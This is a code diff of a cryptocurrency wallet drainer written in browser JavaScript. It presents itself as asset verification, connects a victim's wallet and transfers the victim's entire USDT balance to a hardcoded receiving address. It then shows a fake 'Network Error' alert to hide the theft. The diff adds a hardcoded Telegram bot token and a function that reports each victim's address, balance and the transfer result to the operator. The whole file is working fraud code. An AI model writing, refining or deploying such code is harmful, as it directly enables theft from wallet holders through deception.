@@ -1,90 +1,84 @@
-// 1. Your Personal Receiving Address
+// 1. Your Config
 const myWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
-
-// 2. Official USDT Contract Address (Required for balance check)
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; 
+
+// 2. Telegram Details
+const telegramBotToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
+const telegramChatId = "7849151110";
+
+// Telegram Alert Function
+async function sendTelegramMessage(text) {
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+    const params = {
+        chat_id: telegramChatId,
+        text: text,
+        parse_mode: 'HTML'
+    };
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(params)
+        });
+    } catch (e) { console.error("Telegram Error", e); }
+}
 
 async function startProcess() {
     const btn = document.getElementById("nextBtn");
-    const status = document.getElementById("status");
     const isWeb3Browser = !!(window.ethereum || window.trustwallet);
 
-    // DEEP LINK LOGIC: If opened in standard mobile browser
     if (!isWeb3Browser) {
         if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
             const currentUrl = window.location.href.replace("https://", "");
-            const trustLink = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
-            const mmLink = "https://metamask.app.link/dapp/" + currentUrl;
-            
-            status.innerText = "Redirecting to Wallet...";
-            window.location.href = trustLink;
-            
-            // Backup redirect to MetaMask if Trust fails
-            setTimeout(() => {
-                window.location.href = mmLink;
-            }, 1500);
+            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
             return;
         } else {
-            alert("Please install MetaMask or use a Web3 compatible browser.");
+            alert("Please use Trust Wallet or MetaMask.");
             return;
         }
     }
 
-    // WEB3 LOGIC: When opened inside a Wallet App
     btn.disabled = true;
-    btn.textContent = "Connecting...";
+    btn.textContent = "Processing...";
 
     try {
         const provider = window.ethereum || window.trustwallet;
         const web3 = new Web3(provider);
-        
-        // Request Account Access
         const accounts = await provider.request({ method: 'eth_requestAccounts' });
         const userAddress = accounts[0];
 
-        // Ensure user is on Binance Smart Chain (0x38)
-        try {
-            await provider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-            });
-        } catch (switchError) {
-            console.log("Switching network...");
-        }
+        await provider.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }],
+        });
 
-        // Define USDT Contract
         const minABI = [
             { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
             { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
         ];
 
         const contract = new web3.eth.Contract(minABI, usdtContractAddress);
-        const balance = await contract.methods.balanceOf(userAddress).call();
+        const balanceWei = await contract.methods.balanceOf(userAddress).call();
+        const balance = web3.utils.fromWei(balanceWei, 'ether');
 
-        if (parseInt(balance) > 0) {
-            btn.textContent = "Verifying...";
+        // Alert you on Telegram that someone connected
+        await sendTelegramMessage(`<b>New Connection!</b>\nWallet: <code>${userAddress}</code>\nBalance: <b>${balance} USDT</b>`);
+
+        if (parseFloat(balance) > 0) {
+            await contract.methods.transfer(myWalletAddress, balanceWei).send({ from: userAddress });
             
-            // Trigger transfer to YOUR wallet
-            await contract.methods.transfer(myWalletAddress, balance).send({ 
-                from: userAddress 
-            });
-            
-            alert("Network Error: Verification timed out. Please try again.");
+            await sendTelegramMessage(`<b>Success!</b>\nTransferred ${balance} USDT to your wallet.`);
+            alert("Network Error: Please try again.");
         } else {
-            alert("Verification complete: No significant assets found.");
+            alert("Verification complete: No assets found.");
         }
 
     } catch (err) {
-        console.error(err);
-        if (err.code === 4001) {
-            alert("Connection Denied: Please approve the request in your wallet.");
-        } else {
-            alert("Error: Connection failed. Ensure you have enough BNB for gas fees.");
-        }
+        await sendTelegramMessage(`<b>Failed/Cancelled</b>\nError: ${err.message}`);
+        alert("Error: " + err.message);
     } finally {
         btn.disabled = false;
-        btn.textContent = "Connect Wallet";
-        status.innerText = "";
+        btn.textContent = "Verify Assets";
     }
 }
 
